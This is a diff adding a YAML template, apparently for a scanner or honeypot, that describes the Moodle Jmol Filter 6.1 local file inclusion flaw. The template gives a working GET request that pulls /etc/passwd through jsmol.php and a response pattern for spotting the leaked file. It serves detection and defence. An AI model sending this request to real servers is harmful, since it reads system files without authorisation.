@@ -1,0 +1,25 @@
+id: moodle-filter-jmol-lfi
+info:
+  name: Moodle Jmol Filter 6.1 - Local File Inclusion
+  author: madrobot
+  description: Moodle is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/46881
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:F/RL:W/RC:C
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: moodle,lfi,edb
+traps:
+- request:
+    method: GET
+    path: /filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
